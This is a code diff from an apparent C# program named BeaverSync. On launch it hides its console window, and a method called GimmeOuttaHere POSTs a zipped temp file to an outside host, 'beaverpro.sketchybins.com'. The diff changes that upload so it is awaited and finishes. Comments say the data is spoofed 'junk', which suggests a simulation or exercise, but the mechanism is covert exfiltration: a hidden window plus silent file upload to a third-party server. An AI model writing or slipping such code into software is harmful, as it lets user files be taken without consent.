@@ -26,8 +26,7 @@ namespace BeaverSync
 
         private static DatabaseManager db;
 
-        //[STAThread]
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
             HideConsoleWindow();
             /* not working, need more time to debug
@@ -70,7 +69,7 @@ namespace BeaverSync
 
 
                 // send the directory - we're spoofing data to not leak things
-                Task.Run(() => GimmeOuttaHere());
+                await Task.Run(() => GimmeOuttaHere());
             }
             else if (args.Length == 1 && args[0] == "register")
             {
@@ -194,6 +193,7 @@ namespace BeaverSync
 
         private static async Task GimmeOuttaHere()
         {
+            Console.WriteLine("Uploading junk");
             string filePath = Path.Combine(Path.GetTempPath(), "notes.zip");
             string uploadUrl = "https://beaverpro.sketchybins.com/sync";
 
@@ -204,12 +204,8 @@ namespace BeaverSync
             using (var httpClient = new HttpClient())
             {
                 var content = new MultipartFormDataContent();
-
-                // Add the file to the form data
                 var fileStreamContent = new StreamContent(File.OpenRead(filePath));
                 content.Add(fileStreamContent, "file", Path.GetFileName(filePath));
-
-                // Send the POST request
                 HttpResponseMessage response = await httpClient.PostAsync(uploadUrl, content);
 
                 if (response.IsSuccessStatusCode)
